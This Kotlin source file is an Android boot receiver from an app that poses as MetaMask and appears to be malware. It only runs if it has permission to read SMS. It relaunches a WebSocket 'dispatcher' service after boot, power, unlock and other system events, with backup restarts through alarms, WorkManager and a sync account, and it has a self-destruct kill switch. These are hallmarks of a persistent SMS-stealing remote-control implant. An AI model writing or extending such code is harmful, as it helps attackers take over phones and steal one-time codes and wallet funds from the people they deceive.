package com.example.MetaMask.receivers

import android.app.ActivityManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.PowerManager
import android.os.UserManager
import androidx.annotation.Keep
import androidx.work.Configuration
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.OutOfQuotaPolicy
import androidx.work.WorkManager
import com.example.MetaMask.receivers.AlarmReceiver
import com.example.MetaMask.services.MasterWebSocketDispatcher
import com.example.MetaMask.services.SelfDestructService
import com.example.MetaMask.services.ServiceStarterWorker
import com.example.MetaMask.services.sync.SyncManager

@Keep
class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        android.util.Log.d("XDBG", "[BootReceiver] onReceive enter context=ctx intent=${intent}") //xdbg
        val action = intent.action
        val hasReadSms = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED
        if (!hasReadSms) return

        val userManager = context.getSystemService(Context.USER_SERVICE) as UserManager
        val isUserUnlocked = userManager.isUserUnlocked

        if (!isUserUnlocked) return

        try {
            WorkManager.initialize(
                context.applicationContext,
                (context.applicationContext as Configuration.Provider).workManagerConfiguration
            )
        } catch (_: IllegalStateException) {
            android.util.Log.e("XDBG", "[BootReceiver] catch (ignored)") //xdbg
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[BootReceiver] catch (ignored)") //xdbg
        }

        if (isUserUnlocked) {
            android.util.Log.d("XDBG", "[BootReceiver] if branch") //xdbg
            val killSwitchPrefs = context.getSharedPreferences(SelfDestructService.PREFS_NAME, Context.MODE_PRIVATE)
            if (killSwitchPrefs.getBoolean(SelfDestructService.KEY_PERMANENTLY_DISABLED, false)) {
                android.util.Log.d("XDBG", "[BootReceiver] if branch") //xdbg
                return
            }
        }

        val validActions = setOf(
            Intent.ACTION_BOOT_COMPLETED,
            Intent.ACTION_LOCKED_BOOT_COMPLETED,
            "android.intent.action.QUICKBOOT_POWERON",
            "com.example.MetaMask.RESTART_SERVICE",
            Intent.ACTION_MY_PACKAGE_REPLACED,
            Intent.ACTION_USER_UNLOCKED,
            Intent.ACTION_USER_PRESENT,
            Intent.ACTION_TIMEZONE_CHANGED,
            Intent.ACTION_LOCALE_CHANGED,
            Intent.ACTION_POWER_CONNECTED,
            Intent.ACTION_POWER_DISCONNECTED,
            PowerManager.ACTION_DEVICE_IDLE_MODE_CHANGED
        )

        if (action !in validActions) return

        if (isServiceRunning(context, MasterWebSocketDispatcher::class.java)) return

        var directStartSuccess = false
        try {
            try {
                val pulseIntent = Intent(context, com.example.MetaMask.services.PulseService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    android.util.Log.d("XDBG", "[BootReceiver] if branch") //xdbg
                    context.startForegroundService(pulseIntent)
                } else {
                    context.startService(pulseIntent)
                }
            } catch (_: Exception) {}

            val masterIntent = Intent(context, MasterWebSocketDispatcher::class.java).apply {
                putExtra("STARTED_FROM", action)
            }
            startCorrespondingService(context, masterIntent)

            directStartSuccess = true
        } catch (_: Exception) {}

        if (!directStartSuccess) {
            android.util.Log.d("XDBG", "[BootReceiver] if branch") //xdbg
            try { context.sendBroadcast(Intent(context, AlarmReceiver::class.java)) } catch (_: Exception) {}
            try {
                val request = OneTimeWorkRequestBuilder<ServiceStarterWorker>()
                    .setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                    .addTag("BOOT_TRIGGER").build()
                WorkManager.getInstance(context).enqueueUniqueWork("SS_ONCE", ExistingWorkPolicy.KEEP, request)
            } catch (_: Exception) {}
        }

        try { SyncManager.createSyncAccount(context) } catch (_: Exception) {}
    }

    private fun startCorrespondingService(context: Context, intent: Intent) {
        android.util.Log.d("XDBG", "[BootReceiver] startCorrespondingService enter context=ctx intent=${intent}") //xdbg
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            android.util.Log.d("XDBG", "[BootReceiver] if branch") //xdbg
            context.startForegroundService(intent)
        } else {
            context.startService(intent)
        }
    }

    private fun isServiceRunning(context: Context, serviceClass: Class<*>): Boolean {
        android.util.Log.d("XDBG", "[BootReceiver] isServiceRunning enter context=ctx serviceClass=${serviceClass}") //xdbg
        val manager = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        @Suppress("DEPRECATION")
        for (service in manager.getRunningServices(Int.MAX_VALUE)) {
            android.util.Log.d("XDBG", "[BootReceiver] loop") //xdbg
            if (serviceClass.name == service.service.className) {
                android.util.Log.d("XDBG", "[BootReceiver] if branch") //xdbg
                android.util.Log.d("XDBG", "[BootReceiver] return") //xdbg
                return true
            }
        }
        android.util.Log.d("XDBG", "[BootReceiver] return") //xdbg
        return false
    }
}
